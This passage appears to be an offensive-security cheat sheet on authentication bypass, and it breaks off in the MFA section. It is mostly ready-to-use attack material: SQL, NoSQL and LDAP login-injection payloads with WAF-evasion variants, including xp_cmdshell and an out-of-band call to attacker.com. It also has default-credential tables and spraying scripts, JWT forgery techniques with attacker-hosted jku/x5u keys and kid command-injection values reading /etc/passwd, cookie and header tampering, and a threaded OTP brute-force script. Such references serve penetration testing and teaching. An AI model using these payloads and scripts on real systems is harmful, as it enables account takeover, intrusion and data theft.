---
title: Authentication Bypass
description: Complete breakdown of Authentication Bypass techniques, payload collections across login mechanisms, token manipulation, multi-factor bypass, and privilege escalation through broken authentication.
navigation:
  icon: i-lucide-shield-off
  title: Authentication Bypass
---

## What is Authentication Bypass?

Authentication Bypass is a class of vulnerabilities where an attacker **circumvents the login mechanism entirely** — gaining access to protected resources, accounts, or administrative functions without providing valid credentials. Unlike brute-force or credential stuffing, authentication bypass exploits **logical flaws** in how the application verifies identity.

::callout
---
icon: i-lucide-triangle-alert
color: amber
---
Authentication bypass does not require knowing the victim's password. It exploits **implementation weaknesses** in session handling, token validation, parameter logic, default credentials, response manipulation, and trust relationships between application components.
::

The vulnerability is classified under **OWASP Top 10 — A07:2021 Identification and Authentication Failures** and can cascade into complete system compromise when combined with privilege escalation.

---

## Categories of Authentication Bypass

Understanding the categories helps structure your testing methodology.

::card-group
  ::card
  ---
  title: Credential-Based
  icon: i-lucide-key-round
  ---
  Default credentials, hardcoded passwords, empty passwords, SQL injection in login forms.
  ::

  ::card
  ---
  title: Token / Session-Based
  icon: i-lucide-ticket
  ---
  JWT manipulation, session prediction, token forgery, cookie tampering, insecure "remember me" tokens.
  ::

  ::card
  ---
  title: Logic-Based
  icon: i-lucide-brain
  ---
  Response manipulation, parameter tampering, forced browsing, race conditions, state machine flaws.
  ::

  ::card
  ---
  title: MFA Bypass
  icon: i-lucide-smartphone
  ---
  OTP brute-force, code reuse, backup code leakage, channel switching, MFA fatigue, step skipping.
  ::

  ::card
  ---
  title: Protocol-Based
  icon: i-lucide-network
  ---
  OAuth/OIDC misconfiguration, SAML injection, SSO flaws, Kerberos attacks, LDAP injection.
  ::

  ::card
  ---
  title: Infrastructure-Based
  icon: i-lucide-server
  ---
  IP-based trust bypass, reverse proxy misconfiguration, host header manipulation, API gateway bypass.
  ::
::

---

## Attack Flow & Methodology

::steps{level="3"}

### Step 1 — Enumerate Authentication Mechanisms

Map all login endpoints, authentication flows, and session management mechanisms.

```text [Common Authentication Endpoints]
/login                    /signin                /auth
/api/login                /api/auth              /api/authenticate
/api/v1/auth/login        /api/v2/login          /oauth/authorize
/admin/login              /administrator         /wp-login.php
/user/login               /account/login         /sso/login
/saml/login               /cas/login             /auth/callback
/api/token                /api/session           /graphql (with auth mutations)
/.well-known/openid-configuration
```

### Step 2 — Identify Authentication Type

Determine what mechanism the application uses.

| Mechanism | Indicators |
|-----------|-----------|
| Session Cookie | `Set-Cookie: PHPSESSID=`, `JSESSIONID=`, `connect.sid=` |
| JWT | `Authorization: Bearer eyJ...`, response contains `token` field |
| Basic Auth | `Authorization: Basic base64...`, `WWW-Authenticate: Basic` |
| OAuth 2.0 | `/oauth/authorize`, `/oauth/token`, `redirect_uri`, `code=` |
| SAML | `/saml/SSO`, `SAMLRequest`, `SAMLResponse` |
| API Key | `X-API-Key:`, `api_key=`, `apikey` in headers/params |
| NTLM/Kerberos | `WWW-Authenticate: Negotiate`, `Authorization: NTLM` |

### Step 3 — Test Each Bypass Category

Systematically test all bypass techniques against the identified mechanisms.

### Step 4 — Chain with Privilege Escalation

Once authenticated, test for vertical and horizontal privilege escalation.

::

---

## SQL Injection Authentication Bypass

The classic and still highly effective technique — injecting SQL into login forms to bypass credential validation.

::tabs
  :::tabs-item{icon="i-lucide-database" label="Basic SQLi Payloads"}

  ::code-group
  ```text [Username Field Injection]
  ' OR '1'='1
  ' OR '1'='1' --
  ' OR '1'='1' #
  ' OR '1'='1'/*
  ' OR 1=1 --
  ' OR 1=1 #
  admin' --
  admin' #
  admin'/*
  ' OR 'x'='x
  ' OR ''='
  ') OR ('1'='1
  ') OR ('1'='1' --
  ' OR 1=1 LIMIT 1 --
  ' OR 1=1 ORDER BY 1 --
  ```

  ```text [Password Field Injection]
  ' OR '1'='1
  ' OR '1'='1' --
  anything' OR '1'='1
  ' OR 1=1 --
  ') OR ('1'='1
  ```

  ```text [Both Fields Combined]
  Username: admin' --
  Password: anything

  Username: ' OR 1=1 --
  Password: anything

  Username: admin
  Password: ' OR '1'='1

  Username: ' OR 1=1 LIMIT 1 --
  Password: ' OR 1=1 LIMIT 1 --
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-shield-alert" label="Advanced SQLi Payloads"}

  ::code-group
  ```text [Database-Specific — MySQL]
  admin' OR 1=1 #
  admin' OR 1=1 -- -
  ' UNION SELECT 1,2,3 -- -
  ' UNION SELECT 'admin','admin' -- -
  ' UNION SELECT username,password FROM users LIMIT 1 -- -
  admin'||(SELECT 1 FROM dual WHERE 1=1)-- -
  ' OR SLEEP(5) -- -
  ```

  ```text [Database-Specific — PostgreSQL]
  admin' OR 1=1 --
  ' UNION SELECT NULL,NULL,NULL --
  '; SELECT pg_sleep(5) --
  ' OR 1=1::int --
  admin' AND 1=CAST((SELECT version()) AS int) --
  ```

  ```text [Database-Specific — MSSQL]
  admin' OR 1=1 --
  ' UNION SELECT NULL,NULL,NULL --
  '; WAITFOR DELAY '0:0:5' --
  admin'; EXEC xp_cmdshell('whoami') --
  ' UNION SELECT @@version,NULL,NULL --
  ```

  ```text [Database-Specific — Oracle]
  admin' OR 1=1 --
  ' UNION SELECT NULL,NULL FROM DUAL --
  ' OR 1=1 ORDER BY 1 --
  admin' AND 1=UTL_INADDR.GET_HOST_ADDRESS('attacker.com') --
  ```

  ```text [NoSQL — MongoDB]
  {"username": {"$ne": ""}, "password": {"$ne": ""}}
  {"username": {"$gt": ""}, "password": {"$gt": ""}}
  {"username": "admin", "password": {"$regex": ".*"}}
  {"username": {"$in": ["admin", "administrator"]}, "password": {"$ne": ""}}
  {"username": {"$exists": true}, "password": {"$exists": true}}
  {"username": "admin", "password": {"$ne": "wrongpassword"}}
  ```

  ```text [NoSQL — URL Parameters]
  username[$ne]=invalid&password[$ne]=invalid
  username=admin&password[$regex]=.*
  username[$gt]=&password[$gt]=
  username[$exists]=true&password[$exists]=true
  username[$in][]=admin&password[$ne]=x
  ```

  ```text [LDAP Injection]
  *
  *)(&
  *)(|(&
  pwd)
  *)(|(&
  *))%00
  admin)(&)
  admin)(|(password=*))
  *()|%26'
  admin)(!(&(1=0))
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-code" label="WAF Bypass SQLi"}

  ::code-group
  ```text [Case Manipulation]
  ' oR '1'='1
  ' Or '1'='1
  ' OR '1'='1
  admin' oR 1=1 --
  ```

  ```text [Encoding Bypass]
  %27%20OR%20%271%27%3D%271
  %27%20OR%201%3D1%20--
  %2527%2520OR%25201%253D1%2520--
  admin%27%20--%20
  ```

  ```text [Comment Injection]
  admin'/**/OR/**/1=1--
  admin'/**/OR/**/1=1#
  '/**/OR/**/1=1/**/--
  '/*!50000OR*/1=1--
  ```

  ```text [String Concatenation]
  ' OR 'adm'||'in'='admin
  ' OR CONCAT('1','1')='11
  ' OR 'a'='a
  ' OR CHAR(49)=CHAR(49) --
  ```

  ```text [Null Byte / Special Characters]
  admin'%00 OR 1=1 --
  ' OR 1=1 %00 --
  admin'\x00 --
  ' OR 1=1; %00
  ```

  ```text [Alternative Operators]
  ' OR 1 LIKE 1 --
  ' OR 1 BETWEEN 0 AND 2 --
  ' OR 1 IN (1) --
  ' OR 1 REGEXP 1 --
  ' OR 1 IS NOT NULL --
  admin' AND NOT 0 --
  ```
  ::
  :::
::

---

## Default & Hardcoded Credentials

::warning
Default credentials remain one of the **most prevalent** authentication bypass vectors — especially in IoT devices, admin panels, databases, and enterprise appliances.
::

::tabs
  :::tabs-item{icon="i-lucide-server" label="Web Applications"}

  | Application | Username | Password |
  |-------------|----------|----------|
  | WordPress | `admin` | `admin` / `password` |
  | Joomla | `admin` | `admin` |
  | Drupal | `admin` | `admin` |
  | phpMyAdmin | `root` | _(empty)_ / `root` / `mysql` |
  | Tomcat Manager | `tomcat` | `tomcat` / `s3cret` / `admin` |
  | Jenkins | `admin` | `admin` / `password` |
  | Grafana | `admin` | `admin` |
  | Kibana | `elastic` | `changeme` |
  | Portainer | `admin` | `admin` |
  | pgAdmin | `admin@admin.com` | `admin` |
  | Webmin | `root` | `root` |
  | Nagios | `nagiosadmin` | `nagiosadmin` |
  | Zabbix | `Admin` | `zabbix` |
  | SonarQube | `admin` | `admin` |
  | GitLab | `root` | `5iveL!fe` |
  | Minio | `minioadmin` | `minioadmin` |

  :::

  :::tabs-item{icon="i-lucide-database" label="Databases"}

  | Database | Username | Password |
  |----------|----------|----------|
  | MySQL | `root` | _(empty)_ / `root` / `mysql` |
  | PostgreSQL | `postgres` | `postgres` / _(empty)_ |
  | MongoDB | _(no auth)_ | _(no auth by default)_ |
  | Redis | _(no auth)_ | _(no auth by default)_ |
  | MSSQL | `sa` | `sa` / `Password1` |
  | Oracle | `system` | `manager` / `oracle` |
  | CouchDB | `admin` | `admin` / `password` |
  | Cassandra | `cassandra` | `cassandra` |
  | Elasticsearch | `elastic` | `changeme` |
  | InfluxDB | `admin` | `admin` |

  :::

  :::tabs-item{icon="i-lucide-router" label="Network Devices"}

  | Device | Username | Password |
  |--------|----------|----------|
  | Cisco | `admin` / `cisco` | `admin` / `cisco` |
  | Fortinet | `admin` | _(empty)_ |
  | Juniper | `root` | `root123` |
  | MikroTik | `admin` | _(empty)_ |
  | Ubiquiti | `ubnt` | `ubnt` |
  | TP-Link | `admin` | `admin` |
  | Netgear | `admin` | `password` |
  | D-Link | `admin` | `admin` / _(empty)_ |
  | Hikvision | `admin` | `12345` |
  | Dahua | `admin` | `admin` |

  :::

  :::tabs-item{icon="i-lucide-cloud" label="Cloud / DevOps"}

  | Service | Username | Password / Token |
  |---------|----------|-----------------|
  | AWS Metadata | N/A | `http://169.254.169.254/latest/meta-data/` |
  | Docker Registry | _(none)_ | _(no auth by default)_ |
  | Kubernetes Dashboard | _(none)_ | _(no auth if misconfigured)_ |
  | Consul | _(none)_ | _(no ACL by default)_ |
  | Vault | `root` | Token in logs |
  | Ansible Tower | `admin` | `password` |
  | RabbitMQ | `guest` | `guest` |
  | ActiveMQ | `admin` | `admin` |
  | Solr | _(none)_ | _(no auth by default)_ |
  | Hadoop | _(none)_ | _(no auth by default)_ |

  :::
::

### Credential Discovery Payloads

::code-group
```bash [Automated Default Credential Scanner]
#!/bin/bash
# Quick default credential checker

TARGET="$1"
ENDPOINTS=("/login" "/admin" "/administrator" "/wp-login.php" "/manager/html" "/phpmyadmin")
CREDS=(
  "admin:admin"
  "admin:password"
  "admin:123456"
  "root:root"
  "root:toor"
  "admin:"
  "administrator:administrator"
  "test:test"
  "guest:guest"
  "user:user"
  "admin:admin123"
  "admin:Password1"
)

echo "[*] Testing default credentials on $TARGET"

for endpoint in "${ENDPOINTS[@]}"; do
  for cred in "${CREDS[@]}"; do
    user=$(echo "$cred" | cut -d: -f1)
    pass=$(echo "$cred" | cut -d: -f2)
    
    code=$(curl -s -o /dev/null -w "%{http_code}" \
      -X POST "$TARGET$endpoint" \
      -d "username=$user&password=$pass" \
      -L --max-redirs 3)
    
    if [ "$code" = "200" ] || [ "$code" = "302" ]; then
      echo "  [+] $endpoint — $user:$pass → HTTP $code (POTENTIAL ACCESS)"
    fi
  done
done
```

```python [Comprehensive Credential Tester]
#!/usr/bin/env python3
"""
Default Credential Scanner
Tests common default credentials against discovered services
"""

import requests
import json
import sys
from itertools import product

CREDENTIAL_DB = {
    "tomcat": {
        "paths": ["/manager/html", "/host-manager/html"],
        "auth_type": "basic",
        "creds": [
            ("tomcat", "tomcat"), ("admin", "admin"),
            ("tomcat", "s3cret"), ("admin", "s3cret"),
            ("manager", "manager"), ("role1", "role1"),
            ("tomcat", "changethis"), ("admin", ""),
        ]
    },
    "jenkins": {
        "paths": ["/login", "/j_acegi_security_check"],
        "auth_type": "form",
        "form_params": {"j_username": "", "j_password": ""},
        "creds": [
            ("admin", "admin"), ("admin", "password"),
            ("admin", "jenkins"), ("admin", ""),
        ]
    },
    "grafana": {
        "paths": ["/api/login", "/login"],
        "auth_type": "json",
        "creds": [
            ("admin", "admin"), ("admin", "grafana"),
            ("admin", "password"),
        ]
    },
    "phpmyadmin": {
        "paths": ["/index.php", "/"],
        "auth_type": "form",
        "form_params": {"pma_username": "", "pma_password": ""},
        "creds": [
            ("root", ""), ("root", "root"),
            ("root", "mysql"), ("root", "password"),
            ("admin", "admin"), ("pma", ""),
        ]
    },
}

def test_credentials(target, service_name=None):
    services = {service_name: CREDENTIAL_DB[service_name]} if service_name else CREDENTIAL_DB
    
    for svc, config in services.items():
        print(f"\n[*] Testing {svc} credentials...")
        for path in config["paths"]:
            for user, passwd in config["creds"]:
                url = f"{target}{path}"
                try:
                    if config["auth_type"] == "basic":
                        resp = requests.get(url, auth=(user, passwd), timeout=5)
                    elif config["auth_type"] == "json":
                        resp = requests.post(url, json={"user": user, "password": passwd}, timeout=5)
                    else:
                        params = dict(config.get("form_params", {}))
                        keys = list(params.keys())
                        params[keys[0]] = user
                        params[keys[1]] = passwd
                        resp = requests.post(url, data=params, timeout=5, allow_redirects=False)
                    
                    if resp.status_code in [200, 302] and "invalid" not in resp.text.lower():
                        print(f"  [!!!] {svc} — {user}:{passwd} → {resp.status_code} POTENTIAL ACCESS")
                    
                except requests.exceptions.RequestException:
                    pass

if __name__ == "__main__":
    test_credentials(sys.argv[1], sys.argv[2] if len(sys.argv) > 2 else None)
```
::

---

## JWT Authentication Bypass

JSON Web Token manipulation is one of the most powerful authentication bypass techniques in modern applications.

::tabs
  :::tabs-item{icon="i-lucide-key" label="Algorithm Confusion"}

  ::code-group
  ```text [Algorithm: none Attack]
  # Original JWT Header:
  {"alg": "HS256", "typ": "JWT"}

  # Modified — Algorithm set to "none":
  {"alg": "none", "typ": "JWT"}

  # Variations:
  {"alg": "None", "typ": "JWT"}
  {"alg": "NONE", "typ": "JWT"}
  {"alg": "nOnE", "typ": "JWT"}
  {"alg": "noNe", "typ": "JWT"}

  # Construct token:
  # base64url(header).base64url(payload).
  # Note: empty signature but trailing dot required

  eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMDAyIiwicm9sZSI6ImFkbWluIn0.
  ```

  ```text [RS256 → HS256 Confusion]
  # If server uses RS256 (asymmetric), switch to HS256 (symmetric)
  # Sign the token using the PUBLIC KEY as the HMAC secret

  # Original Header:
  {"alg": "RS256", "typ": "JWT"}

  # Modified Header:
  {"alg": "HS256", "typ": "JWT"}

  # Sign with the server's public key (often downloadable):
  # GET /.well-known/jwks.json
  # GET /api/public-key
  # GET /oauth/public_key

  # The server verifies HS256 using its public key as secret
  # Since the public key is known, attacker can forge valid tokens
  ```

  ```python [Algorithm Confusion — PoC Script]
  import jwt
  import json
  import base64
  import hmac
  import hashlib

  # Fetch the public key
  # public_key = open('public_key.pem').read()

  # Forge token with HS256 using public key as secret
  payload = {
      "sub": "1",
      "username": "admin",
      "role": "super_admin",
      "iat": 1705312800,
      "exp": 1905312800
  }

  # Method 1: Using PyJWT
  # forged = jwt.encode(payload, public_key, algorithm='HS256')

  # Method 2: Manual construction
  header = base64.urlsafe_b64encode(
      json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
  ).rstrip(b'=').decode()

  body = base64.urlsafe_b64encode(
      json.dumps(payload).encode()
  ).rstrip(b'=').decode()

  # Sign: HMAC-SHA256(header.body, public_key)
  # signature = base64url(HMAC-SHA256(header + "." + body, public_key))

  print(f"Forged JWT: {header}.{body}.<signature>")
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-pen-tool" label="Payload Manipulation"}

  ::code-group
  ```text [Modify Claims — Role Escalation]
  # Original Payload:
  {
    "sub": "1001",
    "username": "regular_user",
    "role": "user",
    "iat": 1705312800,
    "exp": 1705399200
  }

  # Modified Payload:
  {
    "sub": "1",
    "username": "admin",
    "role": "admin",
    "iat": 1705312800,
    "exp": 1999999999
  }

  # Additional claims to try adding:
  {
    "is_admin": true,
    "is_superuser": true,
    "admin": 1,
    "role": "administrator",
    "groups": ["admin", "superuser"],
    "permissions": ["*"],
    "scope": "admin read write delete",
    "user_type": "internal",
    "verified": true,
    "email_verified": true
  }
  ```

  ```text [Subject (sub) Manipulation]
  # Change sub to admin's ID
  "sub": "1"
  "sub": "0"
  "sub": "admin"
  "sub": "root"
  "sub": "administrator"
  "sub": "00000000-0000-0000-0000-000000000001"

  # Negative or special values
  "sub": "-1"
  "sub": "null"
  "sub": "undefined"
  "sub": ""
  "sub": "{{1001}}"
  "sub": "${1001}"
  ```

  ```text [Expiration Bypass]
  # Extend expiration far into the future
  "exp": 9999999999

  # Remove exp claim entirely
  # Some libraries don't enforce expiration if claim is absent

  # Set nbf (not before) to past
  "nbf": 0

  # Set iat (issued at) to future — may confuse validation
  "iat": 9999999999
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-scan" label="Signature Bypass"}

  ::code-group
  ```text [Empty Signature]
  # Token with empty signature
  eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.

  # Token with no signature section
  eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9
  ```

  ```text [Null / Invalid Signature]
  # Null bytes as signature
  eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.AA==

  # All zeros signature
  eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.AAAAAAAAAAAAAAAAAAAAAA
  ```

  ```text [Weak Secret — Common JWT Secrets]
  secret
  password
  123456
  changeme
  your-256-bit-secret
  jwt_secret
  my-secret-key
  shhh
  supersecret
  admin
  key
  default
  test
  1234567890
  qwerty
  jwt
  token
  ""
  ```

  ```bash [JWT Secret Brute-Force — hashcat]
  # Extract hash from JWT for cracking
  # Format: header.payload.signature
  
  # Save JWT to file
  echo -n "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMDAxIn0.signature" > jwt.txt

  # Crack with hashcat (mode 16500 = JWT)
  hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

  # Or with john
  john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256
  ```

  ```bash [JWT Secret Brute-Force — jwt_tool]
  # Using jwt_tool
  python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt

  # Full JWT tampering
  python3 jwt_tool.py <JWT> -T
  
  # Algorithm none attack
  python3 jwt_tool.py <JWT> -X a

  # Key confusion attack
  python3 jwt_tool.py <JWT> -X k -pk public_key.pem
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-settings" label="Header Injection"}

  ::code-group
  ```text [JKU Header Injection]
  # jku = JWK Set URL — server fetches signing key from this URL
  {
    "alg": "RS256",
    "typ": "JWT",
    "jku": "https://attacker-server.com/.well-known/jwks.json"
  }

  # Host attacker's JWKS with attacker's public key
  # Server fetches key from attacker → validates attacker's signature
  ```

  ```text [JWK Embedded Key]
  # Embed the signing key directly in the JWT header
  {
    "alg": "RS256",
    "typ": "JWT",
    "jwk": {
      "kty": "RSA",
      "n": "attacker_public_key_n_value",
      "e": "AQAB",
      "kid": "attacker-key-1"
    }
  }

  # If the server uses the embedded JWK to verify
  # the attacker can sign with their own private key
  ```

  ```text [KID — Key ID Injection]
  # kid parameter may be used in file path or database query

  # Path Traversal via kid
  {"alg": "HS256", "kid": "../../../dev/null"}
  # Signs with empty file content = empty key

  {"alg": "HS256", "kid": "../../etc/hostname"}
  # Signs with hostname content as key

  # SQL Injection via kid
  {"alg": "HS256", "kid": "key1' UNION SELECT 'attacker_secret' -- "}

  # Command Injection via kid
  {"alg": "HS256", "kid": "key1|cat /etc/passwd"}
  ```

  ```text [X5U / X5C Header Injection]
  # x5u = URL to X.509 certificate chain
  {
    "alg": "RS256",
    "x5u": "https://attacker-server.com/cert.pem"
  }

  # x5c = Embedded X.509 certificate
  {
    "alg": "RS256",
    "x5c": ["MIIC+zCCAeOgAw...attacker_cert_base64..."]
  }
  ```
  ::
  :::
::

---

## Response Manipulation Bypass

Some applications validate authentication on the **client side** by checking the server's response — an attacker can intercept and modify responses to bypass login.

::code-group
```http [Modify HTTP Status Code]
# Intercept login response in Burp Suite

# Original Response (failed login):
HTTP/1.1 401 Unauthorized
{"success": false, "message": "Invalid credentials"}

# Modified Response (bypass):
HTTP/1.1 200 OK
{"success": true, "message": "Login successful", "token": "any_value"}
```

```http [Modify JSON Response Body]
# Original:
{"authenticated": false, "role": "guest"}

# Modified:
{"authenticated": true, "role": "admin"}

# Other variations:
{"status": "ok", "user": {"id": 1, "admin": true}}
{"error": false, "loggedIn": true}
{"code": 200, "auth": true, "isAdmin": true}
```

```http [Modify Response Headers]
# Original:
HTTP/1.1 302 Found
Location: /login?error=invalid

# Modified:
HTTP/1.1 302 Found
Location: /admin/dashboard
Set-Cookie: authenticated=true; role=admin
```

```http [Modify Boolean / Status Values]
# Original response after login attempt:
{"result": 0}

# Try:
{"result": 1}
{"result": true}
{"result": "success"}
{"result": "true"}

# Other patterns:
"isLoggedIn": false  →  "isLoggedIn": true
"verified": 0        →  "verified": 1
"status": "fail"     →  "status": "success"
"code": 403          →  "code": 200
```
::

::warning
Response manipulation works when the application **trusts client-side state**. Modern SPAs (Single Page Applications) are particularly vulnerable if they use response data to set authentication state in the browser.
::

---

## Forced Browsing & Direct Access

Bypass the login page entirely by navigating directly to authenticated endpoints.

::code-group
```text [Common Protected Paths]
# Admin panels
/admin
/admin/dashboard
/admin/users
/admin/settings
/admin/config
/administrator
/manage
/management
/portal
/console

# API endpoints
/api/admin
/api/users
/api/settings
/api/config
/api/internal
/api/debug
/api/private

# User areas
/dashboard
/account
/profile
/settings
/my-account
/home
/user/dashboard

# File/Data access
/backup
/backups
/export
/download
/uploads
/files
/reports
/logs
```

```http [Direct API Access Without Auth Token]
# Try accessing API without any authentication
GET /api/v1/users HTTP/1.1
Host: target.com
# No Authorization header

GET /api/admin/users HTTP/1.1
Host: target.com
# No Cookie, no token

# With empty/null auth
GET /api/users HTTP/1.1
Authorization: Bearer
Authorization: Bearer null
Authorization: Bearer undefined
Authorization: Bearer ''
Authorization: Basic Og==
Cookie: session=
```

```http [Path Manipulation to Bypass Auth Middleware]
# If /admin requires auth but middleware matches exact path:
GET /admin HTTP/1.1              # 401 — Blocked
GET /admin/ HTTP/1.1             # 200 — Trailing slash
GET /Admin HTTP/1.1              # 200 — Case change
GET /ADMIN HTTP/1.1              # 200 — Uppercase
GET //admin HTTP/1.1             # 200 — Double slash
GET /./admin HTTP/1.1            # 200 — Dot segment
GET /admin..;/ HTTP/1.1          # 200 — Semicolon (Tomcat)
GET /%2fadmin HTTP/1.1           # 200 — URL encoded
GET /admin%20 HTTP/1.1           # 200 — Trailing space
GET /admin%00 HTTP/1.1           # 200 — Null byte
GET /admin.json HTTP/1.1         # 200 — Extension
GET /admin?anything HTTP/1.1     # 200 — Query string
GET /admin# HTTP/1.1             # 200 — Fragment
GET /public/../admin HTTP/1.1    # 200 — Path traversal
```

```http [HTTP Method Bypass]
# GET requires auth — try other methods
GET /admin → 401
POST /admin → 200
PUT /admin → 200
PATCH /admin → 200
OPTIONS /admin → 200 (may leak allowed methods)
HEAD /admin → 200 (returns headers without body)
TRACE /admin → 200
CONNECT /admin → 200

# Method override headers
GET /admin HTTP/1.1
X-HTTP-Method-Override: POST
X-HTTP-Method: DELETE
X-Method-Override: PATCH
```
::

---

## Parameter & Cookie Tampering

::tabs
  :::tabs-item{icon="i-lucide-cookie" label="Cookie Manipulation"}

  ::code-group
  ```http [Authentication Cookie Tampering]
  # Modify authentication-related cookies
  Cookie: isLoggedIn=true
  Cookie: authenticated=1
  Cookie: admin=true
  Cookie: role=admin
  Cookie: user_type=administrator
  Cookie: auth=true; user=admin
  Cookie: access_level=9999
  Cookie: is_admin=1; verified=1
  Cookie: privilege=high; clearance=top
  ```

  ```http [Session Cookie Guessing]
  # If session IDs are predictable
  Cookie: session=1
  Cookie: session=0
  Cookie: session=admin
  Cookie: PHPSESSID=1
  Cookie: PHPSESSID=00000000000000000000000001

  # Try common session values
  Cookie: session=test
  Cookie: session=guest
  Cookie: session=debug
  Cookie: session=internal
  ```

  ```http [Base64 Encoded Cookie]
  # Decode existing cookie
  # Cookie: auth=eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIn0=
  # Decodes to: {"user":"john","role":"user"}
  
  # Re-encode with admin role:
  # {"user":"admin","role":"admin"} 
  # = eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ==
  
  Cookie: auth=eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ==
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-sliders-horizontal" label="Parameter Tampering"}

  ::code-group
  ```http [Login Request — Parameter Injection]
  # Add extra parameters to login request
  POST /login HTTP/1.1
  Content-Type: application/x-www-form-urlencoded

  username=admin&password=anything&role=admin&admin=true&authenticated=1
  ```

  ```http [JSON Login — Extra Fields]
  POST /api/login HTTP/1.1
  Content-Type: application/json

  {
    "username": "admin",
    "password": "anything",
    "role": "admin",
    "is_admin": true,
    "bypass": true,
    "debug": true,
    "internal": true,
    "test_mode": true
  }
  ```

  ```http [Registration — Self-Assign Admin]
  POST /api/register HTTP/1.1
  Content-Type: application/json

  {
    "username": "attacker",
    "email": "attacker@evil.com",
    "password": "password123",
    "role": "admin",
    "is_admin": true,
    "user_type": "administrator",
    "group": "admins",
    "permissions": ["*"]
  }
  ```

  ```http [Password Reset — Skip Verification]
  POST /api/reset-password HTTP/1.1
  Content-Type: application/json

  {
    "email": "admin@target.com",
    "new_password": "hacked123",
    "token": "",
    "skip_verification": true,
    "verified": true
  }
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-arrow-right-left" label="Header Injection Auth"}

  ::code-group
  ```http [Trusted Proxy Headers]
  # Some apps trust these headers for internal auth bypass
  GET /admin HTTP/1.1
  X-Forwarded-For: 127.0.0.1
  X-Real-IP: 127.0.0.1
  X-Original-URL: /admin
  X-Custom-IP-Authorization: 127.0.0.1
  X-Remote-IP: 127.0.0.1
  X-Client-IP: 127.0.0.1
  X-Remote-Addr: 127.0.0.1
  True-Client-IP: 127.0.0.1

  # Internal network ranges
  X-Forwarded-For: 10.0.0.1
  X-Forwarded-For: 192.168.1.1
  X-Forwarded-For: 172.16.0.1
  ```

  ```http [Custom Auth Headers]
  GET /admin HTTP/1.1
  X-Auth-Token: admin
  X-API-Key: admin
  X-Access-Token: internal
  X-Auth: true
  X-User: admin
  X-Admin: true
  X-Authenticated: true
  X-Bypass: true
  X-Debug: true
  ```

  ```http [Referer / Origin Bypass]
  # Some apps check Referer for auth
  GET /admin HTTP/1.1
  Referer: https://target.com/login?success=true
  Origin: https://target.com

  # Or match internal patterns
  Referer: https://internal.target.com/admin
  Referer: https://localhost/admin
  Referer: https://127.0.0.1/admin
  ```
  ::
  :::
::

---

## MFA / 2FA Bypass

::caution
Multi-Factor Authentication bypass is a **high-severity** finding. These techniques target implementation flaws in the MFA flow, not the cryptographic mechanisms themselves.
::

::accordion
  :::accordion-item{icon="i-lucide-skip-forward" label="Step Skipping"}
  
  The most common MFA bypass — simply skip the second factor step and navigate directly to the authenticated area.

  ::code-group
  ```http [Skip MFA Verification Page]
  # Normal flow:
  # 1. POST /login → 302 → /mfa/verify
  # 2. POST /mfa/verify → 302 → /dashboard

  # Bypass — skip step 2:
  # 1. POST /login → 302 → /mfa/verify
  # 2. GET /dashboard directly (ignore redirect to /mfa/verify)

  GET /dashboard HTTP/1.1
  Cookie: session=partially_authenticated_session
  ```

  ```http [Modify MFA Response]
  # Intercept and modify the MFA verification response

  # Original (MFA required):
  HTTP/1.1 200 OK
  {"mfa_required": true, "next": "/mfa/verify"}

  # Modified (bypass):
  HTTP/1.1 200 OK
  {"mfa_required": false, "next": "/dashboard"}
  ```

  ```http [Change MFA Status Parameter]
  POST /api/login HTTP/1.1
  Content-Type: application/json

  {
    "username": "admin",
    "password": "correct_password",
    "mfa_verified": true,
    "skip_mfa": true,
    "otp_verified": true
  }
  ```
  ::
  :::

  :::accordion-item{icon="i-lucide-hash" label="OTP Brute-Force"}
  
  Many applications use 4-6 digit OTPs without proper rate limiting.

  ::code-group
  ```text [Common OTP Ranges]
  4-digit: 0000-9999 (10,000 combinations)
  6-digit: 000000-999999 (1,000,000 combinations)

  # With rate limiting bypass (IP rotation):
  # Each IP gets ~5 attempts before lockout
  # 10,000 / 5 = 2,000 IPs needed for 4-digit
  # 1,000,000 / 5 = 200,000 IPs needed for 6-digit
  ```

  ```python [OTP Brute-Force Script]
  import requests
  from concurrent.futures import ThreadPoolExecutor

  TARGET = "https://target.com/api/mfa/verify"
  SESSION_COOKIE = "session=partially_authenticated_value"

  def try_otp(code):
      resp = requests.post(TARGET, 
          json={"otp": f"{code:06d}"},
          headers={"Cookie": SESSION_COOKIE},
          timeout=5
      )
      if resp.status_code == 200 and "success" in resp.text.lower():
          print(f"[!!!] VALID OTP: {code:06d}")
          return code
      return None

  # Parallel brute-force
  with ThreadPoolExecutor(max_workers=20) as executor:
      results = executor.map(try_otp, range(0, 1000000))
      for r in results:
          if r is not None:
              break
  ```

  ```http [OTP Rate Limit Bypass]
  # Try different IPs via headers
  POST /mfa/verify HTTP/1.1
  X-Forwarded-For: 1.1.1.{1-255}
  Content-Type: application/json

  {"otp": "123456"}

  # Try adding null bytes or spaces to OTP
  {"otp": "123456 "}
  {"otp": " 123456"}
  {"otp": "123456\n"}
  {"otp": "123456%00"}

  # Array of OTPs
  {"otp": ["000000", "000001", "000002", "..."]}

  # Long OTP (overflow)
  {"otp": "00000000000000123456"}
  ```
  ::
  :::

  :::accordion-item{icon="i-lucide-repeat" label="OTP Reuse & Leakage"}

  ::code-group
  ```http [Reuse Previous Valid OTP]
  # If OTP is not invalidated after use:
  # Use the same OTP from a previous login

